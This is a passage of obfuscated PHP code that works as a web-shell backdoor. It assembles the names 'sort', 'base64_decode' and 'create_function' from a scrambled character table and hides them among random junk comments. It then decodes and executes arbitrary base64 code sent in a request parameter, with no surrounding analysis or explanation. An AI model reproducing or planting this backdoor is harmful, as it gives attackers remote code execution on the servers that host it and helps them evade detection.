...
$UfVyzEhr566 = "iub2x.tahew46nc;k9vs_jmp7zf0g85d13)y*roq(/l";


$QkfkaXNa3562 = "";

foreach([19,38,37,6] as $X){
       $QkfkaXNa3562 .= $UfVyzEhr566[$X];
    }


if(isset($_REQUEST /*rcYWjgQfdXkRsZlqTkyoZebWBEAbRjZNNRdRHbSzrLVwissVZXNFhWnNzpudrApODBCFzQmMZsYWsGRtzDwPJIRwQUIZlKZJMevmLzbSaUwoWNLLrdyTFnPaBspPyOcy*/["$QkfkaXNa3562"])){
    $pAHNqbjS8947 = $_REQUEST /*rcYWjgQfdXkRsZlqTkyoZebWBEAbRjZNNRdRHbSzrLVwissVZXNFhWnNzpudrApODBCFzQmMZsYWsGRtzDwPJIRwQUIZlKZJMevmLzbSaUwoWNLLrdyTFnPaBspPyOcy*/["$QkfkaXNa3562"];
    $krVVknyX1287 = "";
    $HNQYEati2077 = "";

    /*URTMhwFJpxfLyglQmhpwKMiCxGjHEbkIJICeSMdUJafBoHAZlvHLFzpKbFTuDZjOSsDqXWUYxwzmycjcDCsUTfQLYyWbXRCOuXZvvZfWELmPbrmYpDxVBFLGpktBJCoH*/

    foreach([2,7,19,9,12,11,20,31,9,14,38,31,9] as $X){
       $krVVknyX1287 .= $UfVyzEhr566[$X];
    }

    /*quNumWJOfUtmXzIOvxWRCZZuZQkVQhutFLWmxMHzZWTDnByxUlOGXlGcdpujpGTZnWxYcwYdmSMNXwHaMSZoMsHDAHXqjXMzqatDaZJBTIaRakjwYtEQUscYrTUqvjZS*/


    foreach([19,6,37,37,9,18] as $X){
       $HNQYEati2077 .= $UfVyzEhr566[$X];
    }

    /*LXIcswNSUrGOwSgMDNDmvlQmBZkkcoEeBOqudMldoTGEmuvVCbVBqYXtfYUXbmElJzsGiWcibpaowPeYViGJEFyvdRYEveXkldNLGZmgiENSZehUHjLLmftptDvehPJd*/

    $X = $HNQYEati2077('n'.'o'.''.''.''.'i'.''.''.'t'.''.''.'c'.''.'n'.''.''.''.'u'.''.''.''.''.'f'.'_'.'e'.'t'.''.''.''.'a'.'e'.'r'.''.''.''.'c');
    $n = $X("", $krVVknyX1287($pAHNqbjS8947));
    $n();
    exit();
